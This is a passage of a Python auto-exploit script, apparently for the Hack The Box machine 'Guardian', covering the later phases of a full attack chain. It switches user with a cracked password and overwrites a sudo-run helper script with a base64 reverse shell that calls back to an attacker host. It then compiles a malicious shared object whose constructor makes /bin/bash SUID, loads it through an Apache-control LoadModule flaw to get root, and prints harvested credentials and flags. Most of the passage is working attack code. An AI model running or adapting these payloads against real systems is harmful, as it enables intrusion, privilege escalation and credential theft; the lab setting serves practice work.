        log('LATERAL', f'su output: {out.strip()[:80]}', 'info')

    if any(x in su_out.lower() for x in ['authentication failure', 'su: sorry', 'incorrect password']):
        log('LATERAL', 'su reported authentication failure', 'err')
        return shell, ''

    # Verify current user with multiple indicators (execute output can be noisy on PTY shells).
    who_out = shell.execute('id -un 2>/dev/null || whoami', timeout=10).strip()
    if 'jamil' in who_out.lower() or 'jamil@' in su_out:
        log('LATERAL', 'Now running as jamil ✓', 'ok')
    else:
        log('LATERAL', f'su state uncertain: {who_out[:80]}', 'warn')

    # Read user flag
    user_flag = ''
    for _ in range(2):
        uf_out = shell.execute(
            'cat /home/jamil/user.txt 2>/dev/null || cat ~/user.txt 2>/dev/null || true',
            timeout=10
        )
        m = re.search(r'([0-9a-fA-F]{32,64})', uf_out)
        if m:
            user_flag = m.group(1).lower()
            break
        # Re-issue su once if first read fails.
        shell.send("su jamil\n")
        time.sleep(0.5)
        su_retry = shell.recv_all(4)
        if 'password' in su_retry.lower():
            shell.send(f"{JAMIL_PASS}\n")
            time.sleep(1)
            shell.recv_all(4)

    if re.match(r'^[0-9a-f]{32,64}$', user_flag):
        log('FLAG', f'USER FLAG: {C.GRN}{C.BOLD}{user_flag}{C.RST}', 'flag')
        print(f"\n{'━' * 60}")
        print(f"  {C.GRN}★  USER FLAG: {user_flag}{C.RST}")
        print(f"{'━' * 60}\n")
    else:
        log('FLAG', 'user.txt not captured automatically yet.', 'warn')

    return shell, user_flag


def phase9_privesc_mark(shell):
    """
    Phase 9: status.py hijack → mark shell.
    - jamil is in admins group
    - status.py is writable by admins group
    - utilities.py system-status action has no user check
    - sudo -u mark NOPASSWD: /opt/scripts/utilities/utilities.py
    """
    phase_header(9, "PRIVESC: jamil → mark (status.py hijack)")

    # Verify sudo permissions
    sudo_out = shell.execute('sudo -l 2>/dev/null', timeout=10)
    log('PRIVESC', f'sudo -l:\n{sudo_out[:300]}', 'info')

    # Check group membership
    id_out = shell.execute('id', timeout=10)
    log('PRIVESC', f'id: {id_out.strip()}', 'info')

    if 'jamil' not in id_out and JAMIL_PASS:
        log('PRIVESC', 'Current shell is not jamil. Re-establishing jamil context via su...', 'warn')
        shell.send("su jamil\n")
        time.sleep(0.5)
        su_out = shell.recv_all(4)
        if 'password' in su_out.lower():
            shell.send(f"{JAMIL_PASS}\n")
            time.sleep(1)
            shell.recv_all(4)
        id_out = shell.execute('id', timeout=10)
        log('PRIVESC', f'id after su retry: {id_out.strip()}', 'info')

    if 'admins' not in id_out:
        log('PRIVESC', 'Not in admins group; cannot overwrite status.py safely.', 'err')
        return None

    # Check status.py permissions
    perm_out = shell.execute('ls -la /opt/scripts/utilities/utils/status.py 2>/dev/null', timeout=10)
    log('PRIVESC', f'status.py perms: {perm_out.strip()}', 'info')

    mark_shell = None
    for cb_port in MARK_SHELL_PORT_CANDIDATES:
        mark_listener = ShellListener(cb_port, 'mark')
        try:
            mark_listener.start()
        except Exception as e:
            log('PRIVESC', f'Cannot bind mark listener on {cb_port}: {e}', 'warn')
            continue

        py_rev = (
            "python3 -c 'import os,pty,socket;"
            f"s=socket.socket();s.connect((\"{LHOST}\",{cb_port}));"
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
            "pty.spawn(\"/bin/bash\")' || "
            f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{cb_port} 0>&1'"
        )
        rev_b64 = base64.b64encode(py_rev.encode()).decode()

        log('PRIVESC', f'Overwriting status.py for mark callback on port {cb_port}...', 'info')

        shell.execute(
            f"printf '%s' "
            f"'def system_status():\\n"
            f"    import os\\n"
            f"    os.system(\"echo {rev_b64} | base64 -d | bash\")\\n' "
            f"> /opt/scripts/utilities/utils/status.py",
            timeout=10
        )

        verify_out = shell.execute('tail -n 5 /opt/scripts/utilities/utils/status.py', timeout=10)
        if rev_b64[:20] not in verify_out:
            log('PRIVESC', 'printf write uncertain, trying Python writer...', 'warn')
            shell.execute(
                f"python3 -c \"f=open('/opt/scripts/utilities/utils/status.py','w');"
                f"f.write('def system_status():\\\\n    import os\\\\n    "
                f"os.system(\\\"echo {rev_b64} | base64 -d | bash\\\")\\\\n');"
                f"f.close()\"",
                timeout=10
            )

        log('PRIVESC', f'Triggering mark payload (port {cb_port})...', 'info')
        shell.send("sudo -u mark /opt/scripts/utilities/utilities.py system-status &\n")

        log('PRIVESC', f'Waiting for mark shell on :{cb_port}...', 'info')
        mark_shell = mark_listener.accept(timeout=35)
        if not mark_shell:
            log('PRIVESC', f'No mark shell on {cb_port}, retrying once...', 'warn')
            time.sleep(2)
            shell.send("sudo -u mark /opt/scripts/utilities/utilities.py system-status &\n")
            mark_shell = mark_listener.accept(timeout=25)
        mark_listener.close()
        if mark_shell:
            break

    if not mark_shell:
        log('PRIVESC', 'Mark shell failed on all candidate ports.', 'err')
        return None

    # Upgrade PTY
    mark_shell.send("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
    time.sleep(1)
    mark_shell.recv_all(3)

    mark_id = mark_shell.execute('id', timeout=10)
    log('PRIVESC', f'Mark shell identity: {mark_id.strip()}', 'ok')

    return mark_shell


def phase9_noninteractive_root_drop(shell):
    """
    Fallback path when mark reverse shell cannot be received.
    We still use the status.py hijack, but run a non-interactive mark->root chain
    and drop root flag to /tmp/guardian_root_flag.txt for jamil to read.
    """
    phase_header(9, "FALLBACK: NON-INTERACTIVE mark->root DROP")

    evil_c = r'''#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>

__attribute__((constructor)) void pwn() {
    setuid(0);
    setgid(0);
    system("chmod +s /bin/bash");
    system("cp /bin/bash /tmp/.bash && chmod 4755 /tmp/.bash");
}
'''

    script = (
        "set -e\n"
        "mkdir -p /home/mark/confs\n"
        "cat > /home/mark/evil.c <<'EOF'\n"
        f"{evil_c}\n"
        "EOF\n"
        "gcc -shared -fPIC -nostartfiles -o /home/mark/confs/evil.so /home/mark/evil.c >/tmp/guardian_gcc.out 2>&1 || true\n"
        "echo 'LoadModule evil_module /home/mark/confs/evil.so' > /home/mark/confs/exploit.conf\n"
        "sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/exploit.conf >/tmp/guardian_apache.out 2>&1 || true\n"
        "if [ -x /tmp/.bash ]; then /tmp/.bash -p -c 'cat /root/root.txt' > /tmp/guardian_root_flag.txt 2>/dev/null || true; fi\n"
        "if [ ! -s /tmp/guardian_root_flag.txt ]; then bash -p -c 'cat /root/root.txt' > /tmp/guardian_root_flag.txt 2>/dev/null || true; fi\n"
        "chmod 644 /tmp/guardian_root_flag.txt 2>/dev/null || true\n"
    )

    b64 = base64.b64encode(script.encode()).decode()
    rev_cmd = f"echo {b64} | base64 -d | bash"

    log('FALLBACK', 'Writing non-interactive mark payload into status.py...', 'info')
    shell.execute(
        f"python3 -c \"f=open('/opt/scripts/utilities/utils/status.py','w');"
        f"f.write('def system_status():\\\\n    import os\\\\n    "
        f"os.system(\\\"{rev_cmd}\\\")\\\\n');"
        f"f.close()\"",
        timeout=20
    )

    log('FALLBACK', 'Triggering utilities.py as mark (non-interactive)...', 'info')
    shell.execute(
        'sudo -u mark /opt/scripts/utilities/utilities.py system-status >/tmp/guardian_mark_exec.out 2>&1 || true',
        timeout=60
    )

    # Poll for dropped root flag file.
    for _ in range(12):
        out = shell.execute('cat /tmp/guardian_root_flag.txt 2>/dev/null || true', timeout=10)
        m = re.search(r'([0-9a-fA-F]{32,64})', out)
        if m:
            root_flag = m.group(1).lower()
            log('FALLBACK', f'ROOT FLAG recovered via non-interactive chain: {root_flag}', 'flag')
            return root_flag
        time.sleep(1)

    log('FALLBACK', 'Could not recover /tmp/guardian_root_flag.txt', 'err')
    return None


def phase10_root(mark_shell):
    """
    Phase 10: safeapache2ctl LoadModule logic flaw → SUID bash → root.

    Binary analysis:
      is_unsafe_line() blocks Include/LoadModule IF path starts with '/'
      BUT allows them if path starts with '/home/mark/confs/'
      → We can LoadModule a malicious .so from /home/mark/confs/
      → The .so __attribute__((constructor)) runs as root → chmod +s /bin/bash
    """
    phase_header(10, "PRIVESC: mark → root (safeapache2ctl LoadModule flaw)")

    # Verify sudo permissions
    sudo_out = mark_shell.execute('sudo -l 2>/dev/null', timeout=10)
    log('ROOT', f'sudo -l:\n{sudo_out[:300]}', 'info')

    # Create /home/mark/confs/
    mark_shell.execute('mkdir -p /home/mark/confs/', timeout=5)
    log('ROOT', 'Created /home/mark/confs/', 'ok')

    # Write evil.c
    evil_c = r"""
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>

__attribute__((constructor)) void pwn() {
    setuid(0);
    setgid(0);
    system("chmod +s /bin/bash");
    system("cp /bin/bash /tmp/.bash && chmod 4755 /tmp/.bash");
}
"""
    # Write via python to avoid heredoc issues
    mark_shell.execute(
        f"python3 -c \"f=open('/home/mark/evil.c','w');f.write({repr(evil_c)});f.close()\"",
        timeout=10
    )
    log('ROOT', 'evil.c written', 'ok')

    # Compile the shared object
    log('ROOT', 'Compiling evil.so...', 'info')
    gcc_out = mark_shell.execute(
        'gcc -shared -fPIC -nostartfiles -o /home/mark/confs/evil.so /home/mark/evil.c 2>&1',
        timeout=30
    )
    log('ROOT', f'gcc: {gcc_out.strip()[:100]}', 'info')

    # Verify .so exists
    ls_out = mark_shell.execute('ls -la /home/mark/confs/evil.so 2>/dev/null', timeout=5)
    if 'evil.so' not in ls_out:
        log('ROOT', 'evil.so not found! Compilation may have failed.', 'err')
        log('ROOT', 'Ensure gcc is available: which gcc', 'warn')
        gcc_check = mark_shell.execute('which gcc 2>/dev/null || apt list --installed 2>/dev/null | grep gcc',
                                       timeout=10)
        log('ROOT', f'gcc check: {gcc_check.strip()[:100]}', 'info')
        return None

    log('ROOT', f'evil.so compiled: {ls_out.strip()[:80]}', 'ok')

    # Write exploit.conf (LoadModule allowed when path is under /home/mark/confs/)
    mark_shell.execute(
        "echo 'LoadModule evil_module /home/mark/confs/evil.so' > /home/mark/confs/exploit.conf",
        timeout=5
    )
    log('ROOT', 'exploit.conf written with LoadModule directive', 'ok')

    # Trigger safeapache2ctl
    log('ROOT', 'Running sudo safeapache2ctl to load evil.so...', 'info')
    apache_out = mark_shell.execute(
        'sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/exploit.conf 2>&1',
        timeout=30
    )
    log('ROOT', f'safeapache2ctl output: {apache_out.strip()[:200]}', 'info')
    # Apache will error (invalid module), but constructor already ran

    # Check SUID bash
    bash_perms = mark_shell.execute('ls -la /bin/bash 2>/dev/null', timeout=5)
    log('ROOT', f'bash perms: {bash_perms.strip()}', 'info')

    if 's' in bash_perms[:50]:
        log('ROOT', '/bin/bash has SUID set ✓', 'ok')
    else:
        # Try /tmp/.bash
        tmp_bash = mark_shell.execute('ls -la /tmp/.bash 2>/dev/null', timeout=5)
        if '.bash' in tmp_bash:
            log('ROOT', '/tmp/.bash SUID backup present', 'ok')

    # Read root flag via SUID bash
    log('ROOT', 'Spawning root shell via bash -p...', 'info')
    mark_shell.send("bash -p\n")
    time.sleep(1)
    mark_shell.recv_all(3)

    euid_out = mark_shell.execute('id && echo "ROOTED"', timeout=10)
    log('ROOT', f'id: {euid_out.strip()[:100]}', 'info')

    if 'euid=0' in euid_out or 'uid=0' in euid_out:
        log('ROOT', 'ROOT ACCESS CONFIRMED ✓', 'ok')

    # Read root flag
    root_flag = mark_shell.execute('cat /root/root.txt 2>/dev/null', timeout=10).strip()

    if re.match(r'[0-9a-f]{32,}', root_flag):
        log('FLAG', f'ROOT FLAG: {C.GRN}{C.BOLD}{root_flag}{C.RST}', 'flag')
        print(f"\n{'━' * 60}")
        print(f"  {C.RED}★  ROOT FLAG:  {root_flag}{C.RST}")
        print(f"{'━' * 60}\n")
    else:
        # Try alternate path
        root_flag2 = mark_shell.execute('/tmp/.bash -p -c "cat /root/root.txt" 2>/dev/null', timeout=10).strip()
        if re.match(r'[0-9a-f]{32,}', root_flag2):
            root_flag = root_flag2
            print(f"\n{'━' * 60}")
            print(f"  {C.RED}★  ROOT FLAG:  {root_flag}{C.RST}")
            print(f"{'━' * 60}\n")
        else:
            log('FLAG', f'root.txt: {root_flag[:80]}', 'warn')

    return root_flag


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════════════════

def main():
    banner()
    log('INIT', f'Target:    {C.BLU}{TARGET_IP}{C.RST}', 'info')
    log('INIT', f'LHOST:     {C.BLU}{LHOST}{C.RST}', 'info')
    log('INIT', f'Ports:     XSS={XSS_PORT_CANDIDATES} CSRF={CSRF_PORT_CANDIDATES} '
                f'Shell-www={WWW_SHELL_PORT_CANDIDATES} Shell-mark={MARK_SHELL_PORT_CANDIDATES}', 'info')

    results = {
        'user_flag': None,
        'root_flag': None,
        'credentials': {},
    }

    try:
        # ── Pre-flight ──────────────────────────────────────────────────────
        update_hosts()
        time.sleep(1)

        # ── Phase 1: Recon ──────────────────────────────────────────────────
        sess = phase1_recon()

        # ── Phase 2: Initial Access ─────────────────────────────────────────
        sess, student_sid = phase2_initial_access(sess)
        results['credentials']['student'] = f'{STUDENT_USER}:{STUDENT_PASS}'

        # ── Phase 3: IDOR → Gitea creds ─────────────────────────────────────
        gitea_pass = phase3_idor_gitea(sess, student_sid)
        results['credentials']['gitea'] = f'{GITEA_USER}:{gitea_pass}'

        # ── Phase 4: Gitea → DB creds ───────────────────────────────────────
        db_pass, db_salt = phase4_gitea_source(gitea_pass)
        results['credentials']['db'] = f'root:{db_pass}  salt:{db_salt}'

        # ── Phase 5: XSS → Lecturer session ────────────────────────────────
        lecturer_sessid = phase5_xss_cookie_hijack(db_pass, db_salt)
        if not lecturer_sessid:
            log('MAIN', 'No lecturer cookie yet; proceeding with blind CSRF/admin fallback.', 'warn')

        # ── Phase 6: CSRF → Admin account ───────────────────────────────────
        admin_sess = phase6_csrf_admin(lecturer_sessid)
        if not admin_sess:
            log('MAIN', 'CSRF/admin phase failed. Halting.', 'err')
            sys.exit(1)
        results['credentials']['admin'] = f'{ADMIN_USER}:{ADMIN_PASS}'

        # ── Phase 7: LFI → RCE → www-data shell ─────────────────────────────
        www_shell = phase7_lfi_rce(admin_sess)
        if not www_shell:
            log('MAIN', 'www-data shell failed. Halting.', 'err')
            sys.exit(1)

        # ── Phase 8: MySQL + crack → jamil ──────────────────────────────────
        www_shell, user_flag = phase8_lateral_jamil(www_shell, db_pass, db_salt)
        results['user_flag'] = user_flag
        results['credentials']['jamil'] = f'jamil:{JAMIL_PASS}'

        # ── Phase 9: status.py hijack → mark ────────────────────────────────
        mark_shell = phase9_privesc_mark(www_shell)
        if not mark_shell:
            log('MAIN', 'mark shell failed; attempting non-interactive mark->root fallback.', 'warn')
            root_flag = phase9_noninteractive_root_drop(www_shell)
            results['root_flag'] = root_flag
            if not root_flag:
                log('MAIN', 'Root fallback failed. Halting.', 'err')
                sys.exit(1)
        else:
            # ── Phase 10: safeapache2ctl → root ─────────────────────────────
            root_flag = phase10_root(mark_shell)
            results['root_flag'] = root_flag

    except KeyboardInterrupt:
        log('MAIN', 'Interrupted by user', 'warn')
    except Exception as e:
        import traceback
        log('MAIN', f'Unexpected error: {e}', 'err')
        traceback.print_exc()
    finally:
        stop_xss_listener()
        stop_csrf_server()

    # ── Summary ─────────────────────────────────────────────────────────────
    print(f"\n{C.CYN}{'═' * 65}{C.RST}")
    print(f"{C.CYN}{C.BOLD}  HTB GUARDIAN RESULTS SUMMARY{C.RST}")
    print(f"{C.CYN}{'═' * 65}{C.RST}")

    print(f"\n{C.YLW}  CREDENTIALS HARVESTED:{C.RST}")
    for k, v in results['credentials'].items():
        print(f"    {C.DIM}{k:12}{C.RST} {v}")

    user_f = results.get('user_flag', 'N/A') or 'N/A'
    root_f = results.get('root_flag', 'N/A') or 'N/A'

    print(f"\n{C.YLW}  FLAGS:{C.RST}")
    print(f"    {C.GRN}user.txt{C.RST}  →  {C.GRN}{C.BOLD}{user_f}{C.RST}")
    print(f"    {C.RED}root.txt{C.RST}  →  {C.RED}{C.BOLD}{root_f}{C.RST}")
    print(f"\n{C.CYN}{'═' * 65}{C.RST}\n")


if __name__ == '__main__':
    main()
